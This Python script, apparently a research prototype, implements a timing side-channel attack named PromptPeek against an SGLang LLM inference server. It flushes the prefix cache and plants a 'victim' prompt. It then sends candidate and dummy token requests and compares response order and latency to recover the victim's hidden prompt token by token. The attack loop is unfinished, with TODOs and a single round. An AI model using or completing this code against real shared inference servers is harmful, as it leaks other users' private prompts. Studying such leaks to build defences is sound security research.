import asyncio
import json
import logging
import sys
from typing import List, Tuple

import httpx
import requests
import torch
from transformers import AutoTokenizer
from transformers.models import LlamaForCausalLM

MODEL_NAME_OR_PATH = "/home/marcorentap/.cache/huggingface/hub/models--meta-llama--Llama-3.2-1B-Instruct/snapshots/9213176726f574b556790deb65791e0c5aa438b6"
SGLANG_SERVER = "http://localhost:30000"
CANDIDATES_SIZE = 8
DUMMIES_SIZE = 8
MAX_TOKENS = 128
TEMPERATURE = 0

model = LlamaForCausalLM.from_pretrained(MODEL_NAME_OR_PATH)
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME_OR_PATH)
client = httpx.AsyncClient(timeout=120)


def gen_next_tokens(prefix: str) -> Tuple[List[str], List[str]]:
    inputs = tokenizer(prefix, return_tensors="pt")
    outputs = model(**inputs)
    logits = outputs.logits

    last_token_logits = logits[0, -1, :]

    topk = torch.topk(last_token_logits, k=CANDIDATES_SIZE)
    top_indices = topk.indices
    candidates = [tokenizer.decode([token_id]) for token_id in top_indices.tolist()]

    bottomk = torch.topk(last_token_logits, k=DUMMIES_SIZE, largest=False)
    bottom_indices = bottomk.indices
    dummies = [tokenizer.decode([token_id]) for token_id in bottom_indices.tolist()]

    # Top-K, Bottom-K tokens
    return (candidates, dummies)


async def send_request(prompt: str, req_id: str):
    # TODO: Add delay before sending request
    delay = 0

    return await client.post(
        f"{SGLANG_SERVER}/generate",
        json={
            "text": prompt,
            "rid": req_id,
            "sampling_params": {
                "temperature": TEMPERATURE,
                "max_new_tokens": MAX_TOKENS,
            },
        },
        headers={
            "PromptPeek-Request-Id": req_id,
            "PromptPeek-Prompt": prompt,
            "PromptPeek-Delay": str(delay),
        },
    )


async def peek_one(prefix: str):
    cand_toks, dummy_toks = gen_next_tokens(prefix)
    # TODO: Consider whether we should use the same dummy token
    dummy_toks = [dummy_toks[0]] * len(dummy_toks)  # Use the same dummy token

    tasks = []
    for i in range(DUMMIES_SIZE):
        text = prefix + dummy_toks[i] * 2
        id = f"pre_dummy_{i}"
        tasks.append(asyncio.create_task(send_request(text, id)))
    await asyncio.sleep(0.2)

    for i in range(CANDIDATES_SIZE):
        text = prefix + cand_toks[i] * 2
        id = f"candidate_{i}"
        tasks.append(asyncio.create_task(send_request(text, id)))
    await asyncio.sleep(0.2)

    for i in range(DUMMIES_SIZE):
        text = prefix + dummy_toks[i] * 2
        id = f"post_dummy_{i}"
        tasks.append(asyncio.create_task(send_request(text, id)))

    response_order = []
    for task in asyncio.as_completed(tasks):
        res = await task
        body = res.json()

        e2e_latency = body["meta_info"]["e2e_latency"]
        # completion = body["text"]

        req_id = res.request.headers["PromptPeek-Request-Id"]
        prompt = res.request.headers["PromptPeek-Prompt"]
        # delay = res.request.headers["PromptPeek-Delay"]

        response_order.append(
            {"id": req_id, "prompt": prompt, "e2e_latency": e2e_latency}
        )
    return response_order


async def main():
    victim_input = input("Enter victim's prompt: \n")
    known_prefix = input("Enter known prefix: \n")

    # Flush Cache
    requests.post(SGLANG_SERVER + "/flush_cache")

    # Victim
    await send_request(victim_input, "victim_0")

    # TODO: Do proper PromptPeek loop
    while True:
        response_order = await peek_one(known_prefix)
        for res in response_order:
            print(res["id"], res["prompt"])
        break


if __name__ == "__main__":
    asyncio.run(main())
